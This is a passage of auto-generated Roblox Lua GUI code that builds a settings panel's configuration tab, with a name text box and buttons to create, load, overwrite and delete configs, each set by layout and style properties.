G2L["7b"]["PaddingRight"] = UDim.new(0, 3);
G2L["7b"]["PaddingLeft"] = UDim.new(0, 3);
G2L["7b"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox
G2L["7c"] = Instance.new("TextBox", G2L["7a"]);
G2L["7c"]["Name"] = [[textbox]];
G2L["7c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7c"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
G2L["7c"]["TextSize"] = 14;
G2L["7c"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7c"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["7c"]["PlaceholderText"] = [[---]];
G2L["7c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["7c"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.outlineStroke
G2L["7d"] = Instance.new("UIStroke", G2L["7c"]);
G2L["7d"]["Thickness"] = 2;
G2L["7d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7d"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.buttonFade
G2L["7e"] = Instance.new("CanvasGroup", G2L["7c"]);
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.buttonFade.UIGradient
G2L["7f"] = Instance.new("UIGradient", G2L["7e"]);
G2L["7f"]["Rotation"] = 90;
G2L["7f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.text
G2L["80"] = Instance.new("UIStroke", G2L["7c"]);
G2L["80"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.UIPadding
G2L["81"] = Instance.new("UIPadding", G2L["7c"]);
G2L["81"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL
G2L["82"] = Instance.new("Frame", G2L["6d"]);
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["82"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Name"] = [[confignameLABEL]];
G2L["82"]["LayoutOrder"] = 2;
G2L["82"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text
G2L["83"] = Instance.new("TextLabel", G2L["82"]);
G2L["83"]["TextWrapped"] = true;
G2L["83"]["ZIndex"] = 10;
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["TextSize"] = 14;
G2L["83"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["83"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["83"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["83"]["BackgroundTransparency"] = 1;
G2L["83"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["83"]["Text"] = [[Config name]];
G2L["83"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text.UIPadding
G2L["84"] = Instance.new("UIPadding", G2L["83"]);
G2L["84"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text.text
G2L["85"] = Instance.new("UIStroke", G2L["83"]);
G2L["85"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig
G2L["86"] = Instance.new("Frame", G2L["6d"]);
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["86"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Name"] = [[createconfig]];
G2L["86"]["LayoutOrder"] = 4;
G2L["86"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button
G2L["87"] = Instance.new("TextButton", G2L["86"]);
G2L["87"]["BorderSizePixel"] = 0;
G2L["87"]["TextTransparency"] = 1;
G2L["87"]["TextSize"] = 14;
G2L["87"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["87"]["ZIndex"] = 49;
G2L["87"]["BackgroundTransparency"] = 1;
G2L["87"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["87"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.UIPadding
G2L["88"] = Instance.new("UIPadding", G2L["87"]);
G2L["88"]["PaddingTop"] = UDim.new(0, 2);
G2L["88"]["PaddingRight"] = UDim.new(0, 3);
G2L["88"]["PaddingLeft"] = UDim.new(0, 3);
G2L["88"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame
G2L["89"] = Instance.new("Frame", G2L["87"]);
G2L["89"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["89"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["89"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["89"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["89"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.outlineStroke
G2L["8a"] = Instance.new("UIStroke", G2L["89"]);
G2L["8a"]["Thickness"] = 2;
G2L["8a"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.buttonFade
G2L["8b"] = Instance.new("CanvasGroup", G2L["89"]);
G2L["8b"]["BorderSizePixel"] = 0;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.buttonFade.UIGradient
G2L["8c"] = Instance.new("UIGradient", G2L["8b"]);
G2L["8c"]["Rotation"] = 90;
G2L["8c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.text
G2L["8d"] = Instance.new("TextLabel", G2L["87"]);
G2L["8d"]["ZIndex"] = 2;
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["TextSize"] = 14;
G2L["8d"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Text"] = [[Create config]];
G2L["8d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.text.text
G2L["8e"] = Instance.new("UIStroke", G2L["8d"]);
G2L["8e"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.fillbar
G2L["8f"] = Instance.new("Frame", G2L["86"]);
G2L["8f"]["ZIndex"] = 90;
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["Name"] = [[fillbar]];
G2L["8f"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---
G2L["90"] = Instance.new("Frame", G2L["6d"]);
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["90"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Name"] = [[---DIVIDER---]];
G2L["90"]["LayoutOrder"] = 5;
G2L["90"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame
G2L["91"] = Instance.new("Frame", G2L["90"]);
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["91"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["91"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["91"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["91"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["92"] = Instance.new("UIStroke", G2L["91"]);
G2L["92"]["Thickness"] = 2;
G2L["92"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.buttonFade
G2L["93"] = Instance.new("CanvasGroup", G2L["91"]);
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["94"] = Instance.new("UIGradient", G2L["93"]);
G2L["94"]["Rotation"] = 90;
G2L["94"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.UIStroke
G2L["95"] = Instance.new("UIStroke", G2L["91"]);
G2L["95"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["95"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.UICorner
G2L["96"] = Instance.new("UICorner", G2L["91"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.UIPadding
G2L["97"] = Instance.new("UIPadding", G2L["90"]);
G2L["97"]["PaddingTop"] = UDim.new(0, 3);
G2L["97"]["PaddingRight"] = UDim.new(0, 6);
G2L["97"]["PaddingLeft"] = UDim.new(0, 6);
G2L["97"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load
G2L["98"] = Instance.new("Frame", G2L["6d"]);
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["98"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["98"]["Name"] = [[load]];
G2L["98"]["LayoutOrder"] = 8;
G2L["98"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button
G2L["99"] = Instance.new("TextButton", G2L["98"]);
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["TextTransparency"] = 1;
G2L["99"]["TextSize"] = 14;
G2L["99"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["99"]["ZIndex"] = 49;
G2L["99"]["BackgroundTransparency"] = 1;
G2L["99"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["99"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["99"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.UIPadding
G2L["9a"] = Instance.new("UIPadding", G2L["99"]);
G2L["9a"]["PaddingTop"] = UDim.new(0, 2);
G2L["9a"]["PaddingRight"] = UDim.new(0, 3);
G2L["9a"]["PaddingLeft"] = UDim.new(0, 3);
G2L["9a"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame
G2L["9b"] = Instance.new("Frame", G2L["99"]);
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["9b"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["9b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["9b"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame.outlineStroke
G2L["9c"] = Instance.new("UIStroke", G2L["9b"]);
G2L["9c"]["Thickness"] = 2;
G2L["9c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame.buttonFade
G2L["9d"] = Instance.new("CanvasGroup", G2L["9b"]);
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.buttonFrame.buttonFade.UIGradient
G2L["9e"] = Instance.new("UIGradient", G2L["9d"]);
G2L["9e"]["Rotation"] = 90;
G2L["9e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.text
G2L["9f"] = Instance.new("TextLabel", G2L["99"]);
G2L["9f"]["ZIndex"] = 2;
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["TextSize"] = 14;
G2L["9f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["BackgroundTransparency"] = 1;
G2L["9f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Text"] = [[Load config]];
G2L["9f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.button.text.text
G2L["a0"] = Instance.new("UIStroke", G2L["9f"]);
G2L["a0"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.load.fillbar
G2L["a1"] = Instance.new("Frame", G2L["98"]);
G2L["a1"]["ZIndex"] = 90;
G2L["a1"]["BorderSizePixel"] = 0;
G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a1"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a1"]["Name"] = [[fillbar]];
G2L["a1"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite
G2L["a2"] = Instance.new("Frame", G2L["6d"]);
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["a2"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Name"] = [[overwrite]];
G2L["a2"]["LayoutOrder"] = 8;
G2L["a2"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button
G2L["a3"] = Instance.new("TextButton", G2L["a2"]);
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["TextTransparency"] = 1;
G2L["a3"]["TextSize"] = 14;
G2L["a3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a3"]["ZIndex"] = 49;
G2L["a3"]["BackgroundTransparency"] = 1;
G2L["a3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.UIPadding
G2L["a4"] = Instance.new("UIPadding", G2L["a3"]);
G2L["a4"]["PaddingTop"] = UDim.new(0, 2);
G2L["a4"]["PaddingRight"] = UDim.new(0, 3);
G2L["a4"]["PaddingLeft"] = UDim.new(0, 3);
G2L["a4"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame
G2L["a5"] = Instance.new("Frame", G2L["a3"]);
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["a5"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["a5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a5"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["a5"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame.outlineStroke
G2L["a6"] = Instance.new("UIStroke", G2L["a5"]);
G2L["a6"]["Thickness"] = 2;
G2L["a6"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame.buttonFade
G2L["a7"] = Instance.new("CanvasGroup", G2L["a5"]);
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.buttonFrame.buttonFade.UIGradient
G2L["a8"] = Instance.new("UIGradient", G2L["a7"]);
G2L["a8"]["Rotation"] = 90;
G2L["a8"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.text
G2L["a9"] = Instance.new("TextLabel", G2L["a3"]);
G2L["a9"]["ZIndex"] = 2;
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["TextSize"] = 14;
G2L["a9"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["BackgroundTransparency"] = 1;
G2L["a9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["Text"] = [[Overwrite config]];
G2L["a9"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.button.text.text
G2L["aa"] = Instance.new("UIStroke", G2L["a9"]);
G2L["aa"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.overwrite.fillbar
G2L["ab"] = Instance.new("Frame", G2L["a2"]);
G2L["ab"]["ZIndex"] = 90;
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["Name"] = [[fillbar]];
G2L["ab"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete
G2L["ac"] = Instance.new("Frame", G2L["6d"]);
G2L["ac"]["BorderSizePixel"] = 0;
G2L["ac"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ac"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["ac"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ac"]["Name"] = [[delete]];
G2L["ac"]["LayoutOrder"] = 8;
G2L["ac"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button
G2L["ad"] = Instance.new("TextButton", G2L["ac"]);
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["TextTransparency"] = 1;
G2L["ad"]["TextSize"] = 14;
G2L["ad"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ad"]["ZIndex"] = 49;
G2L["ad"]["BackgroundTransparency"] = 1;
G2L["ad"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.UIPadding
G2L["ae"] = Instance.new("UIPadding", G2L["ad"]);
G2L["ae"]["PaddingTop"] = UDim.new(0, 2);
G2L["ae"]["PaddingRight"] = UDim.new(0, 3);
G2L["ae"]["PaddingLeft"] = UDim.new(0, 3);
G2L["ae"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame
G2L["af"] = Instance.new("Frame", G2L["ad"]);
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["af"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["af"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["af"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["af"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame.outlineStroke
G2L["b0"] = Instance.new("UIStroke", G2L["af"]);
G2L["b0"]["Thickness"] = 2;
G2L["b0"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame.buttonFade
G2L["b1"] = Instance.new("CanvasGroup", G2L["af"]);
G2L["b1"]["BorderSizePixel"] = 0;
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b1"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b1"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame.buttonFade.UIGradient
G2L["b2"] = Instance.new("UIGradient", G2L["b1"]);
G2L["b2"]["Rotation"] = 90;
G2L["b2"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.text
G2L["b3"] = Instance.new("TextLabel", G2L["ad"]);
G2L["b3"]["ZIndex"] = 2;
G2L["b3"]["BorderSizePixel"] = 0;
G2L["b3"]["TextSize"] = 14;
G2L["b3"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b3"]["BackgroundTransparency"] = 1;
G2L["b3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b3"]["Text"] = [[Delete config]];
G2L["b3"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.text.text
G2L["b4"] = Instance.new("UIStroke", G2L["b3"]);
G2L["b4"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.fillbar
